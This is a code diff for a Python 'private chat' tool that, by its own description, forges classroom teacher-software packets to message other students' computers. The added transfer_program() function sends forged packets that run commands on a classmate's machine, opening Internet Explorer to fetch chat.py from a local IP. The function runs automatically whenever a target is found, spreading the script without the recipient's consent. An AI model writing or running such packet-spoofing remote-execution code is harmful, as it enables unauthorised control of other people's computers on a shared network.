@@ -247,7 +247,7 @@ def run_from_cmd():
     except Exception as e:
         print("[-] %s " % e)
         input(
-            "检测到程序似乎发生了一些很神奇的问题,请回报给2409(duck),然后按回车键退出"
+            "[崩溃检查模块] 检测到程序似乎发生了一些很神奇的问题,请回报给2409(duck),然后重试一遍？"
         )
 
 
@@ -255,6 +255,7 @@ def chat_main():
     global NoExit
     NoExit = True
     print("\n\n ~~欢迎使用 *小小私聊*！~~\n\n")
+    print("原理：通过伪造教师端数据包来发送聊天消息~")
     sleep(0.1)
     print("Author: ht0Ruial, 2409(duck)")
     sleep(0.1)
@@ -280,9 +281,10 @@ def chat_main():
         for i in range(10):
             print(".", end="")
             sleep(0.1)
-        if isOnline(get_IP_prefix(getIP()) + str(chat_StuID2IP(toStuID))):
+        if debug == True or isOnline(get_IP_prefix(getIP()) + str(chat_StuID2IP(toStuID))):
+            transfer_program()
             print("似乎找到了！")
-            msg = "111"
+            msg = "你好呀，%i号同学" % toStuID
             while msg != "bye":
                 sleep(0.8)
                 msg = str(input("和{}号悄悄说：".format(toStuID)))
@@ -357,11 +359,20 @@ def get_IP_prefix(ip_address):
 
 
 def transfer_program():
-
-    return 0
+    print("发送命令中...")
+    send_list = []
+    send_list.append(pkg_sendlist("-msg", str("{}号正在尝试给你发送以下文件：chat.py，已帮你打开浏览器接收。".format(chat_whoami()))))
+    send(send_list)
+    send_list = []
+    send_list.append(pkg_sendlist("-c", str("iexplore.exe 192.168.48.177/chat.py")))
+    send(send_list)
+    send_list = []
+    send_list.append(pkg_sendlist("-c", str("iexplore.exe "+str(getIP())+"}/chat.py")))
+    send(send_list)
 
 
 version = 20240102
+debug = False
 
 if __name__ == "__main__":  # 程序最先执行此处！当用户双击直接执行本脚本时...
     run_from_cmd()
